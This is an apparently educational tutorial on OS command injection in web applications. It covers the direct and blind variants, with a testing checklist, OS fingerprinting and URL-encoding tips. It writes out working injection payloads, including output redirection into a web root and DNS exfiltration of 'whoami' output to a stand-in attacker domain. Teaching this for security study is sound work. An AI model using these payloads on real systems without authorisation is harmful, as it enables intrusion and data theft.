Concept & Theory: OS Command Injection

What is OS Command Injection?

The Core Problem: A web application takes user input and glues it directly into a command that the operating system executes. The app doesn't check if the input is safe or if it contains special characters that could change what the command does.

Analogy: Imagine a security guard who asks for your name and then shouts it into a megaphone without checking what you actually said. If you say "Hello", they shout "Hello". But if you say "Hello & Set off the fire alarm", they shout both commands — and the fire alarm goes off too!

Why Does This Vulnerability Exist?

The OS is ALWAYS there — Every web application runs on a server, and every server has an operating system. The OS is the foundation.

Developers take shortcuts — Sometimes instead of writing code to do something themselves (like pinging a server or converting a file), developers just tell the OS to do it. They call a command directly.

The dangerous pattern:

system("mail -s " + user_subject + " admin@site.com")

This means whatever the user types as the subject gets pasted directly into a command that the OS runs.

The Two Main Variants

Variant 1: Simple/Direct Command Injection (Visible Output)

Definition: The application executes your injected command AND shows you its output on the page.

How to detect it:

  • Find a suspicious input field (Ping tools, File converters, URL with ?cmd=, ?file=, ?host=).
  • Inject an echo test payload: & echo aiwefwlguh &
  • If you see aiwefwlguh anywhere on the page, it's confirmed!

Why a random string? Because it would never normally appear on the page. If you used "test" and saw it, you couldn't be sure if it came from your injection or was already there.

Real Example Payload: https://site.com/check?ip=8.8.8.8 & whoami & (If whoami's output like www-data appears, it's vulnerable).

Common injection characters:

  • & : Run next command (always)
  • && : Run next command ONLY if first succeeds
  • | : Pipe output to next command
  • ; : Run next command (Linux/Unix only)
  • || : Run next command ONLY if first fails

Variant 2: Blind Command Injection

Definition: The application runs your injected command, but you CANNOT see its output on the page. You need other tricks to confirm it worked or to steal data.

Why this happens: The app executes the command in the background and doesn't display its output. Common examples: email forms, feedback submissions, logging functions.

Blind Technique 1: Time Delays

Make the OS pause for a set amount of time. If the response takes longer than normal, your command ran.

  • Linux: & ping -c 10 127.0.0.1 & (ping localhost 10 times, ~1 sec each)
  • Windows: & ping -n 10 127.0.0.1 & (Windows uses -n instead of -c)

Blind Technique 2: Output Redirection to a File

Tell your injected command to save its output to a file inside a folder that the web server publicly serves.

& whoami > /var/www/images/whoami.txt &

After sending, visit https://site.com/images/whoami.txt. If you see www-data, you've extracted data! (You must know a writable public folder path).

Blind Technique 3: Out-of-Band (OAST) Detection

Make the server perform a DNS lookup to a domain you control. You watch your domain's logs to see if the lookup happened.

  • Detecting: & nslookup kgji2ohoyw.attacker-domain.com &
  • Exfiltrating: & nslookup `whoami`.attacker-domain.com & (The output of whoami gets inserted into the domain name!)
Practical Guide

Testing Checklist & OS Detection

Step 1: Try visible output: & echo aiwefwlguh &

Step 2: Try time delay: & ping -c 10 127.0.0.1 &

Step 3: Try file redirect: & whoami > /var/www/images/test.txt &

Step 4: Use OAST: & nslookup `whoami`.YOUR-DOMAIN.com &

Identifying the Operating System:

  • uname -a : Works on Linux, Fails on Windows
  • ver : Fails on Linux, Works on Windows
  • whoami : Works on both
  • id : Works on Linux, Fails on Windows

Clues: .php often = Linux, .aspx often = Windows. Server: Apache = Linux, Server: IIS = Windows.

URL Encoding Rule

IMPORTANT: When injecting into form-encoded requests (like application/x-www-form-urlencoded), special characters must be encoded:

  • Space -> %20
  • & -> %26
  • > -> %3e
  • < -> %3c
  • # -> %23

Without encoding: The server parses & as "new form field" instead of part of your payload value.
